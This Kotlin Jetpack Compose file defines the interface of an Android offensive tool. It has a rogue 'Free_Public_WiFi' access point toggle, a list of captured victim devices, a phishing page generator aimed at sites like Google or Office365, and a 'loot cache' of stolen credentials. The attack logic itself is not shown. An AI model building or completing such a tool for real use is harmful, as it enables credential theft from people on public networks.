package com.example.rabit.ui.network

import androidx.compose.animation.*
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.rabit.ui.theme.*

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun RogueHorizonScreen(
    viewModel: RogueHorizonViewModel,
    onBack: () -> Unit
) {
    val isApActive by viewModel.isApActive.collectAsState()
    val clients by viewModel.clients.collectAsState()
    val credentials by viewModel.credentials.collectAsState()
    val phishingHtml by viewModel.phishingHtml.collectAsState()
    val isGeneratingPhish by viewModel.isGeneratingPhish.collectAsState()

    var targetSite by remember { mutableStateOf("Google") }

    Scaffold(
        containerColor = Obsidian,
        topBar = {
            CenterAlignedTopAppBar(
                title = {
                    Column(horizontalAlignment = Alignment.CenterHorizontally) {
                        Text("ROGUE HORIZON", style = MaterialTheme.typography.titleSmall.copy(fontWeight = FontWeight.Black, color = Platinum))
                        Text("WIRELESS MITM & NEURAL PHISHING", color = Color.Red, fontSize = 9.sp, fontWeight = FontWeight.Bold)
                    }
                },
                navigationIcon = {
                    IconButton(onClick = onBack) {
                        Icon(Icons.AutoMirrored.Filled.ArrowBack, null, tint = Platinum)
                    }
                },
                colors = TopAppBarDefaults.centerAlignedTopAppBarColors(containerColor = Color.Transparent)
            )
        }
    ) { padding ->
        Column(modifier = Modifier.fillMaxSize().padding(padding).padding(16.dp)) {
            // AP Control
            Card(
                colors = CardDefaults.cardColors(containerColor = if (isApActive) Color.Red.copy(alpha = 0.1f) else Color.White.copy(alpha = 0.05f)),
                shape = RoundedCornerShape(12.dp),
                border = androidx.compose.foundation.BorderStroke(1.dp, if (isApActive) Color.Red.copy(alpha = 0.3f) else Color.White.copy(alpha = 0.1f))
            ) {
                Row(modifier = Modifier.padding(16.dp).fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
                    Column(modifier = Modifier.weight(1f)) {
                        Text("ROGUE ACCESS POINT", color = Platinum, fontWeight = FontWeight.Black)
                        Text(if (isApActive) "BROADCASTING: Free_Public_WiFi" else "OFFLINE", color = if (isApActive) Color.Red else Silver, fontSize = 11.sp)
                    }
                    Switch(
                        checked = isApActive,
                        onCheckedChange = { viewModel.toggleAp() },
                        colors = SwitchDefaults.colors(checkedThumbColor = Color.Red, checkedTrackColor = Color.Red.copy(alpha = 0.3f))
                    )
                }
            }

            Spacer(Modifier.height(16.dp))

            // Main Dashboard
            Row(modifier = Modifier.weight(1f), horizontalArrangement = Arrangement.spacedBy(16.dp)) {
                // Clients Column
                Column(modifier = Modifier.weight(1f)) {
                    Text("CAPTURED CLIENTS", color = Silver, fontSize = 10.sp, fontWeight = FontWeight.Black)
                    Spacer(Modifier.height(8.dp))
                    Box(modifier = Modifier.fillMaxSize().background(Color.Black, RoundedCornerShape(12.dp)).border(1.dp, Color.White.copy(alpha = 0.05f), RoundedCornerShape(12.dp))) {
                        LazyColumn(modifier = Modifier.padding(8.dp)) {
                            items(clients) { client ->
                                ClientRow(client)
                            }
                        }
                    }
                }

                // Phishing Column
                Column(modifier = Modifier.weight(1f)) {
                    Text("NEURAL PHISH GENERATOR", color = Silver, fontSize = 10.sp, fontWeight = FontWeight.Black)
                    Spacer(Modifier.height(8.dp))
                    Card(
                        colors = CardDefaults.cardColors(containerColor = Color.White.copy(alpha = 0.05f)),
                        shape = RoundedCornerShape(12.dp)
                    ) {
                        Column(modifier = Modifier.padding(12.dp)) {
                            OutlinedTextField(
                                value = targetSite,
                                onValueChange = { targetSite = it },
                                label = { Text("Target (e.g. Office365)", fontSize = 10.sp) },
                                modifier = Modifier.fillMaxWidth(),
                                colors = OutlinedTextFieldDefaults.colors(focusedTextColor = Platinum, unfocusedTextColor = Platinum),
                                singleLine = true
                            )
                            Spacer(Modifier.height(8.dp))
                            Button(
                                onClick = { viewModel.generatePhishingPage(targetSite, "Mobile/Desktop") },
                                modifier = Modifier.fillMaxWidth(),
                                colors = ButtonDefaults.buttonColors(containerColor = Color.Red.copy(alpha = 0.2f), contentColor = Color.Red),
                                enabled = !isGeneratingPhish
                            ) {
                                if (isGeneratingPhish) CircularProgressIndicator(modifier = Modifier.size(20.dp), color = Color.Red)
                                else Text("GENERATE PAGE", fontSize = 11.sp, fontWeight = FontWeight.Black)
                            }
                        }
                    }
                    
                    Spacer(Modifier.height(12.dp))
                    
                    Text("LOOT CACHE", color = Silver, fontSize = 10.sp, fontWeight = FontWeight.Black)
                    Spacer(Modifier.height(8.dp))
                    Box(modifier = Modifier.fillMaxSize().background(Color.Black, RoundedCornerShape(12.dp)).border(1.dp, Color.White.copy(alpha = 0.05f), RoundedCornerShape(12.dp))) {
                        LazyColumn(modifier = Modifier.padding(8.dp)) {
                            items(credentials) { cred ->
                                CredentialRow(cred)
                            }
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun ClientRow(client: NetworkClient) {
    Surface(
        color = Color.White.copy(alpha = 0.05f),
        shape = RoundedCornerShape(8.dp),
        modifier = Modifier.padding(bottom = 8.dp).fillMaxWidth()
    ) {
        Column(modifier = Modifier.padding(8.dp)) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Icon(Icons.Default.Devices, null, tint = SuccessGreen, modifier = Modifier.size(14.dp))
                Spacer(Modifier.width(8.dp))
                Text(client.deviceType, color = Platinum, fontSize = 11.sp, fontWeight = FontWeight.Bold)
            }
            Text(client.ip, color = Silver, fontSize = 9.sp, fontFamily = FontFamily.Monospace)
            Text(client.mac, color = Silver.copy(alpha = 0.5f), fontSize = 8.sp, fontFamily = FontFamily.Monospace)
        }
    }
}

@Composable
fun CredentialRow(cred: CapturedCredential) {
    Surface(
        color = Color.Red.copy(alpha = 0.1f),
        shape = RoundedCornerShape(8.dp),
        modifier = Modifier.padding(bottom = 8.dp).fillMaxWidth(),
        border = androidx.compose.foundation.BorderStroke(1.dp, Color.Red.copy(alpha = 0.2f))
    ) {
        Column(modifier = Modifier.padding(8.dp)) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Icon(Icons.Default.Key, null, tint = Color.Red, modifier = Modifier.size(14.dp))
                Spacer(Modifier.width(8.dp))
                Text(cred.site, color = Platinum, fontSize = 11.sp, fontWeight = FontWeight.Bold)
            }
            Text("Captured Loot:", color = Silver, fontSize = 8.sp)
            Text("CREDENTIALS_REDACTED", color = Color.Red, fontSize = 9.sp, fontFamily = FontFamily.Monospace)
        }
    }
}
